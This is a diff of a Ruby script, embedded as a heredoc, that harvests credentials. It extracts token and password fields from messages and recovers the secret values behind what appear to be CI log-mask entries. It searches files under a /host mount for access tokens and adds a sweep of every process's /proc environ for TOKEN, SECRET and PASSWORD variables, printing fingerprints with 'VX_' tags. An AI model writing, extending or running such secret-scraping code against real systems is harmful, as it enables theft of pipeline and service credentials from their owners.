@@ -145,11 +145,16 @@ inner = <<~'INNER'
     toks[v] ||= "msg:#{k}" if k =~ /token|authoriz|secret|password|credential|accesstoken|extraheader/i
   end
   unesc.scan(TOKRE).flatten.each { |t| toks[t] ||= "msg:raw" }
-  if (mraw = unesc[/"mask"\s*:\s*(\[.*?\])/m, 1])
-    puts "VX_MASK_ENTRIES=#{mraw.scan(/\{/).size}"
-    mraw.scan(/"(value|pattern)"\s*:\s*"((?:[^"\\]|\\.)*)"/).each do |k, v|
-      toks[v] ||= "mask:#{k}" if v.size.between?(8, 4000)
-    end
+  # mask entries are flat objects {"type":"regex","pattern":".."} or {"type":"contains","value":".."}
+  mentries = unesc.scan(/\{[^{}]*"type"\s*:\s*"(?:regex|contains)"[^{}]*\}/)
+  puts "VX_MASK_ENTRIES=#{mentries.size}"
+  mentries.each_with_index do |me, mi|
+    k, v = me.scan(/"(value|pattern)"\s*:\s*"((?:[^"\\]|\\.)*)"/).first || [nil, nil]
+    next if v.nil?
+    puts "VX_MASK#{mi} #{k}=#{fp(v)}"
+    toks[v] ||= "mask:value" if k == "value" && v.size.between?(8, 4000)
+    dv = v.gsub(/\\(.)/, '\1')
+    toks[dv] ||= "mask:pat_unesc" if dv =~ TOKRE && dv != v
   end
   puts "VX_MSG_TOKS=#{toks.size}"
 
@@ -169,6 +174,22 @@ inner = <<~'INNER'
       d.scan(/x-access-token:([^@\s"']+)/).flatten.each { |t| hits << t }
       hits.compact.uniq.each { |t| toks[t] ||= "file:#{f.sub('/host', '')}" }
       puts "VX_FILE #{f.sub('/host', '')} #{d.size}B hits=#{hits.compact.uniq.size}"
+    end
+  end
+
+  # ---------- proc environ sweep ----------
+  Dir["/proc/[0-9]*/environ"].each do |f|
+    pid = f.split("/")[2]
+    comm = (File.read("/proc/#{pid}/comm").strip rescue "?")
+    d = (File.read(f) rescue next)
+    vars = d.split("\0")
+    hits = d.scan(TOKRE).flatten.uniq
+    hits.each { |t| toks[t] ||= "environ:#{comm}" }
+    interesting = vars.select { |v| v =~ /TOKEN|SECRET|CRED|PASSWORD/i }.map { |v| v.split("=").first }.uniq
+    puts "VX_ENVIRON #{comm}(#{pid}) vars=#{vars.size} tokhits=#{hits.size} named=#{interesting.join(',')}"
+    vars.each do |v|
+      k, _, val = v.partition("=")
+      puts "VX_ENVVAR #{comm} #{k}=#{fp(val)}" if (k =~ /TOKEN|SECRET|PASSWORD|CREDENTIAL/i || val =~ TOKRE) && !val.empty?
     end
   end
 
